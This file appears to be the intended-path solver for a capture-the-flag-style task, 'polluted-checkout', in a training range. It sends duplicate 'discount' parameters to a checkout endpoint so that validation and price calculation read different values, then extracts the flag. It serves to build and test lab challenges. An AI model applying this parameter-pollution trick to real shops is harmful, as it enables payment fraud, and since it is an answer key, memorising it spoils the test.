"""Intended-path solver: HTTP parameter pollution splits validation from calculation."""

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    res = httpx.get(
        f"{ctx.url()}/checkout",
        params=[("price", "50"), ("discount", "10"), ("discount", "100")],
        timeout=10,
    )
    flags = find_flags(res.text)
    captured = flags[0] if flags else None
    return SolveResult(
        results=[
            TaskResult(
                task_id="polluted-checkout",
                ok=bool(captured),
                captured=captured,
                detail=None if captured else "checkout did not yield the flag",
            )
        ]
    )
